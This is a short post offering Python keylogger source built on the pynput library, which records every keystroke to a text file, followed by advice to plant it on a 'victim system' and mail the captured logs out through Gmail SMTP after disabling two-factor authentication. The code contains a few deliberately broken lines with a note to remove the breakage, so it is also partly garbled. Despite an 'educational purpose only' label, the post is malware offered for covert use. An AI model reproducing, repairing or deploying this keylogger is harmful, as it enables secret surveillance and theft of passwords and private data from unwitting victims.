# Keylogger
Posting this for Educational purpose only 

##### CODE #####
Sample code with emblem keylogger 
---------
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key)":"(remove krna hai ")
    logging.info(str(key))

with Listener(on_press=on_press) as listener:()
    listener.join()
    
----------

What More can be done is that you can use pyhton os library to 
make it robust and easily download it in the victim system then with gmail SMTPlib
you can send the rsult your self 

NOTE : you have to remove 2fa from your gmail and allow less secure login activated 
